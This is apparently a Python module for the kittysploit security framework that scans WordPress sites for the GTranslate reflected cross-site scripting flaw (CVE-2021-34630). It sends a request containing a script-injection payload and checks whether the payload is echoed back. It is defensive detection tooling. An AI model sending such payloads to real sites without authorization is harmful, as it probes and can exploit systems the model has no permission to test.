#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In the Pro and Enterprise versions of GTranslate < 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GTranslate < 2.8.65 - Cross-Site Scripting Detection',
        'description': "In the Pro and Enterprise versions of GTranslate < 2.8.65, the gtranslate_request_uri_var function runs at the top of all pages and echoes out the contents of $_SERVER['REQUEST_URI']. Although this uses addslashes, and most modern browsers automatically URLencode requests, this plugin is still vulnerable to Reflected XSS in older browsers such as Internet Explorer 9 or below, or in cases where an attacker is able to modify the request en route between the client and the server, or in cases where the user is using an atypical browsing solution.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'wp', 'wp-plugin', 'gtranslate', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/dfac81bb-7807-4288-aee3-43c7653c6446/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-34630',
        ],
        'cve': 'CVE-2021-34630',
    }

    def run(self):
        path = '/?page</script><script>alert(document.domain)</script>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('</script><script>alert(document.domain)</script>', 'gtranslate',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='GTranslate < 2.8.65 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

